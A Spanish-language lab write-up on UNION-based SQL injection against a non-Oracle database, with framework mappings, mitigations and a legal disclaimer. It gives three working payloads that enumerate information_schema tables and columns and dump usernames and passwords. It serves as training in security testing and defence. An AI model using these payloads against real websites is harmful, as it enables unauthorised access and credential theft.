
# SQL injection attack, listing the database contents on non-Oracle databases

## I. Descripción de la vulnerabilidad o ataque
Este laboratorio presenta un escenario avanzado de explotación de inyección SQL de tipo UNION. Una vez que se detecta que el backend utiliza una base de datos estándar (no Oracle, por ejemplo PostgreSQL), el objetivo del atacante cambia de la simple identificación del entorno hacia la **exfiltración de datos**. El proceso requiere interrogar las tablas del esquema de información (`information_schema`) para mapear la estructura interna del almacenamiento: nombres de tablas, columnas críticas (como usuarios y contraseñas) y, finalmente, extraer las credenciales del usuario administrador para comprometer el control de acceso.

## II. Tabla de Códigos de Referencia (NIST, MITRE, CWE)

| Marco de Referencia | Código / Identificador | Descripción |
| :--- | :--- | :--- |
| **CWE** | CWE-89 | Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') |
| **CWE** | CWE-306 | Missing Authentication for Critical Function |
| **MITRE ATT&CK** | T1190 | Exploit Public-Facing Application (Initial Access) |
| **MITRE ATT&CK** | T1078 | Valid Accounts (Lateral Movement / Persistence) |
| **NIST SP 800-53** | IA-2 | Identification and Authentication (Organizational Users) |
| **OWASP Top 10** | A03:2021-Injection | Categoría principal de vulnerabilidades de inyección |

## III. Detección y Explotación Paso a Paso

### Paso 1: Mapeo de tablas en la base de datos
Determinamos la existencia de tablas de interés consultando las vistas del sistema `information_schema.tables`:
```sql
' UNION SELECT table_name, NULL FROM information_schema.tables--
```

### Paso 2: Mapeo de columnas de la tabla objetivo
Una vez localizada la tabla de usuarios, consultamos las columnas pertenecientes a dicha tabla especifica utilizando `infotmation_schema.columns`:
```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_abcdef'--
```

(Identificamos columnas como `username_abcdef` y `password_abcdef`)
### Paso 3: Exfiltración de credenciales (Payload Final)
Conociendo los nombres exactos de la tabla y sus columnas, realizamos la consulta final para volcar el contenido de las credenciales de los usuarios:
```
' UNION SELECT username_abcdef, password_abcdef FROM users_abcdef--
```

## IV. Mitigación
1. **Implementación de consultas parametrizadas**: Es la única defensa definitiva y robusta contra la inyección de comandos SQL.
2. **Endurecimiento de Bases de Datos (Database Hardening)**: El usuario de la aplicación web no debe poseer privilegios de lectura sobre el catálogo completo de `information_schema` de manera irrestricta.
3. **Mecanismos de Hashing Fuertes**: Las contraseñas en la base de datos jamás deben almacenarse en texto plano. Se debe aplicar un algoritmo de hash criptográfico fuerte (como bcrypt o Argon2) con salt individualizado.

## V. Aviso de Seguridad
[!WARNING]
**Aviso de Seguridad**: El contenido de este documento tiene fines exclusivamente educativos y de desarrollo profesional en pruebas de penetración autorizadas. La explotación de vulnerabilidades en entornos e infraestructura sin el consentimiento explícito y por escrito del propietario es ilegal y está penada por las leyes de ciberseguridad internacionales y locales. El autor no se hace responsable del mal uso de esta información.
